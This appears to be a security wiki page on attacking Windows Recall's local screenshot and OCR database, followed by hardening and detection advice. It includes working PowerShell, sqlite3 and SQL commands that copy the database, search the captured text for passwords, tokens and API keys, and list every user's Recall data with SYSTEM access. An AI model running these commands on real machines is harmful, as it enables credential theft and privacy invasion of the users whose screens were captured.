---
title: Windows Recall attacks
slug: windows-recall-attacks
aliases: [recall-attack-surface, ai-recall-exploitation, copilot-recall]
---

> **TL;DR:** Windows Recall continuously screenshots the desktop and stores OCR text + images in a local SQLite database. An attacker with user-level access can exfiltrate the entire browsing/work history from a single DB file; with SYSTEM, they can harvest Recall data for every user. The feature shipped with minimal encryption, no DLP, and scheduled tasks that run as the user — a privacy and post-exploitation goldmine.

## What it is
Windows Recall (announced May 2024, shipped in Copilot+ PCs) takes periodic screenshots of the active desktop, runs local OCR via the NPU, and stores both the images and extracted text in a SQLite database for semantic search ("find that thing I saw last week"). The feature was designed for local AI-powered retrieval but immediately became a high-value target because it is a plaintext record of everything the user has seen — passwords typed in terminals, banking sessions, private messages, documents, and code.

## Storage and data format

Recall stores its data under the user's profile:

```
%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}\
├── ukg.db              # SQLite database — OCR text, timestamps, window titles
├── ImageStore\         # JPEG screenshots, one per capture interval
└── ...
```

The `ukg.db` database contains:

```sql
-- Key tables
SELECT * FROM WindowCaptureTextIndex_content;  -- OCR text from each capture
SELECT * FROM WindowCapture;                    -- timestamps, window title, app name
-- Join on CaptureId to correlate text with the screenshot image
```

## Attack surface

### 1. Local data exfiltration (user-level)

Any process running as the user can read the Recall database — no elevation required. Malware, a RAT, or a post-exploitation agent simply copies the SQLite file.

```powershell
# Find and copy the Recall database (as the target user)
$recallPath = Get-ChildItem "$env:LOCALAPPDATA\CoreAIPlatform.00\UKP" -Recurse -Filter "ukg.db" -ErrorAction SilentlyContinue
Copy-Item $recallPath.FullName C:\Windows\Temp\recall_dump.db

# Extract all OCR text with timestamps
sqlite3 C:\Windows\Temp\recall_dump.db "SELECT c1, c2 FROM WindowCaptureTextIndex_content LIMIT 50;"
```

MDSec's "TotalRecall" tool automates this:

```cmd
TotalRecall.exe --dump
:: Extracts the full database, screenshots, and OCR text into an output directory
```

### 2. Credential harvesting from OCR text

Recall captures screenshots of password managers showing cleartext, terminal sessions with credentials, and web forms mid-fill. Search the OCR text:

```sql
SELECT c1 FROM WindowCaptureTextIndex_content
WHERE c1 LIKE '%password%' OR c1 LIKE '%secret%' OR c1 LIKE '%token%'
   OR c1 LIKE '%apikey%' OR c1 LIKE '%ssh%';
```

### 3. Cross-user harvesting (SYSTEM)

With SYSTEM or admin access, read every user's Recall data:

```cmd
:: Enumerate all users' Recall databases
dir C:\Users\*\AppData\Local\CoreAIPlatform.00\UKP\*\ukg.db /s /b
```

### 4. Scheduled task abuse

Recall uses scheduled tasks for capture processing. MDSec identified that these tasks run in user context and could be manipulated for persistence or escalation in early builds. Check the task:

```powershell
Get-ScheduledTask | Where-Object { $_.TaskName -match "Recall|WindowsAI|CoreAI" }
# Inspect the task action for hijackable paths or DLLs
```

### 5. Semantic search as recon

Post-compromise, use Recall's own search API to find specific data without manual trawling — query for "bank", "vpn", "admin console", "ssh key", or project-specific keywords.

## What Microsoft hardened (post-backlash)

After intense criticism, Microsoft delayed Recall and added mitigations in later builds:

- **Opt-in by default** (was opt-out) — user must explicitly enable during OOBE
- **Windows Hello required** to access Recall search UI
- **Encryption at rest** with DPAPI user keys (though still accessible to any process running as that user, or to SYSTEM via [[dpapi-secrets]] masterkey extraction)
- **Sensitive content filtering** — attempts to exclude passwords, credit cards (imperfect — OCR-based heuristics miss edge cases)
- **Snapshot exclusion** for InPrivate/Incognito windows and DRM-protected content
- **VBS Enclave** (Virtualization-Based Security) for the search index in later preview builds — moves the decryption key into a VTL1 trustlet, raising the bar to kernel-level or hypervisor-level access

## Limitations of the mitigations

- DPAPI encryption is broken by any process running as the user — malware in user context can call `CryptUnprotectData` with no additional secret. See [[dpapi-secrets]]
- The VBS Enclave protects the search index decryption key, but the screenshots are still JPEG files on the filesystem encrypted with per-user DPAPI — accessible to SYSTEM via masterkey extraction
- Sensitive content filtering relies on pattern matching and OCR confidence — custom formats, non-English text, and obscured credentials slip through
- The entire feature increases the blast radius of any user-context compromise from "what is in memory and on disk right now" to "everything the user has seen in the last N months"

## Detection and defence

- **Disable Recall via Group Policy**: `Computer Configuration → Administrative Templates → Windows Components → Windows AI → Turn off Saving Snapshots for Windows` — the recommended enterprise setting
- **Registry**: `HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsAI\DisableAIDataAnalysis = 1`
- **Monitor access** to `CoreAIPlatform.00\UKP` directories — alert on reads by processes other than the Recall service itself
- **File integrity monitoring** on the Recall database files
- **Sysmon event 11** (FileCreate) and event 1 (ProcessCreate): alert on `sqlite3.exe` or unknown processes accessing Recall paths
- **Endpoint DLP**: flag exfiltration of `.db` files from the Recall directory
- **Educate users**: Recall captures everything — do not type secrets in terminals while it is enabled, do not assume private browsing protects against local capture

## References

- [MDSec — TotalRecall: Exfiltrating Windows Recall Data](https://www.mdsec.co.uk/2024/06/total-recall-exfiltrating-windows-recall-data/) — original attack tooling and research
- [Microsoft — Windows Recall security and privacy architecture](https://support.microsoft.com/en-us/windows/privacy-and-control-over-your-recall-experience-d404f672-7647-41e5-886c-a3c59680af15) — updated hardening details
- [Kevin Beaumont — Recall analysis](https://doublepulsar.com/) — independent security analysis of the feature
- [Alexander Hagenah — TotalRecall tool](https://github.com/xaitax/TotalRecall) — automated Recall data extraction

See also: [[dpapi-secrets]], [[credential-dumping]], [[data-hunting-and-exfiltration]], [[windows-enumeration]], [[credential-guard-bypass]]
